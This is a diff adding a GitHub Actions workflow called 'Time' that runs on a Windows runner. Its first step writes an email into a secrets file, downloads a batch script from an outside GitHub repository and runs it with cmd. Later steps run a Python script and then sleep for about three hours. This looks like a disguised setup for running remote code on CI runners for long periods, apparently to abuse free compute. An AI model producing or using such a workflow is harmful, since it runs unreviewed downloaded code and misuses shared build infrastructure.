@@ -1,0 +1,31 @@
+name: Time
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
+         cmd /c time.bat
+
+      - name: Time Counter
+        run: python time.py
+
+      - name: A
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+
+      - name: B
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  Build2:
+     runs-on: GitHub Actions
